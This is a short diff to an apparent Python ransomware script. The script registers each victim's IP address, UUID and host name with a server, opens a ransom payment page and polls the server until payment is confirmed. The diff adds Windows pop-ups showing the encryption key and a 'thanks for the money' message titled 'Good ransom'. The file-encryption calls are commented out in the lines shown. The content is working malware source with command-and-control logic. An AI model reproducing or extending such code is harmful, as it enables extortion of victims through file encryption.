@@ -3,6 +3,8 @@
 import requests, json, uuid, os
 import re
 import webbrowser
+import ctypes  # An included library with Python install.
+
 from ransomcrypto import *
 
 
@@ -107,7 +109,10 @@ while encryption_key == "":
     request_server("register",IP_ADDRESS,UUID,host_name)
     print encryption_key
 
-
+try :
+    ctypes.windll.user32.MessageBoxW(0, "Encryption key is "+encryption_key, "Good ransom", 1)
+except AttributeError:
+    pass
 
 #browse_files_and_process(True)
 del encryption_key
@@ -119,5 +124,9 @@ webbrowser.open(url,new=2)
 while paid == 0 :
     request_server("paid",IP_ADDRESS,UUID,host_name)
 
-print "OKAY"
+try :
+    ctypes.windll.user32.MessageBoxW(0, "Merci pour l'argent ! :)", "Good ransom", 1)
+except AttributeError:
+    pass
+
 #browse_files_and_process(False)
